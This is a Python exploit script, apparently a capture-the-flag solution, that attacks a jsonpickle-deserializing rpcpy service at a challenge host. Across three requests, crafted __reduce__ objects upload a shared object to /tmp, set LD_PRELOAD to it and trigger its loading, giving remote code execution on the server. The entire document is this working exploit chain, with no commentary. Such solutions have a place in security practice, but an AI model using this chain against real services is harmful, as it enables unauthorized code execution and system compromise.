import jsonpickle
import requests
from rpcpy import application, serializers


class WriteFile(object):
    def __reduce__(self):
        with open(LOCAL_SO_PATH, "rb") as f:
            return application.logging_to_file, (REMOTE_SO_PATH, f.read())


class SetEnviron(object):
    def __reduce__(self):
        return application.set_environ, ("LD_PRELOAD", REMOTE_SO_PATH)


class Trigger(object):
    def __reduce__(self):
        return serializers.get_current_timestamp, ()


def send_payload(obj):
    payload = jsonpickle.dumps(obj)
    print(payload)

    r = requests.post(TARGET_URL, payload, headers={"serializer": "jsonpickle"})
    print(r.text)


TARGET_URL = "http://908e98e33afc3826b1fca2c66d317719.w1chall.io.vn/sayhi"

LOCAL_SO_PATH = "bypass_disablefunc.so"
REMOTE_SO_PATH = "/tmp/bypass_disablefunc.so"

send_payload(WriteFile())
send_payload(SetEnviron())
send_payload(Trigger())
